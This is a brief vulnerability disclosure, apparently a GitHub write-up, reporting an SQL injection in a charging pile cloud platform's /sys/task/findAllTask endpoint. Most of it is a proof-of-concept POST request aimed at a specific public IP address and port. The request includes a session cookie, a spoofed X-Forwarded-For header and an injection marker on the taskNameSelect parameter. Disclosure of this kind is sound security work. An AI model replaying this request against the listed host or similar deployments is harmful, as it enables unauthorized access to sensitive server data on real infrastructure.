There is an SQL injection vulnerability in the charging pile cloud platform of Kehua Data Co., Ltd., which can be exploited to obtain sensitive server information.

official：https://www.kehua.com.cn/

version:1.0

 Vulnerability Path  ： /sys/task/findAllTask

See the login page.

poc：
```
POST /sys/task/findAllTask HTTP/1.1
Host: 139.9.84.235:28080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Request-Ajax: 1
X-Requested-With: XMLHttpRequest
Content-Length: 98
Origin: http://139.9.84.235:28080
Connection: close
Referer: http://139.9.84.235:28080/sys/task/toMain
Cookie: SESSION=cc80acb9-4057-47f1-b4a1-35acfa762996;	
X-Forwarded-For: 127.0.0.1

taskNameSelect=*&isEnableSelect=&_search=false&nd=1726716123695&pageSize=10&pageNo=1&sidx=&sord=asc

```
http://139.9.84.235:28080/doLogout
<img width="952" height="613" alt="image" src="https://github.com/user-attachments/assets/92b7917e-ab0f-4692-8300-4e825074563d" />

<img width="938" height="221" alt="image" src="https://github.com/user-attachments/assets/dd92e50d-cfd9-4400-8415-5be844f9e9e0" />


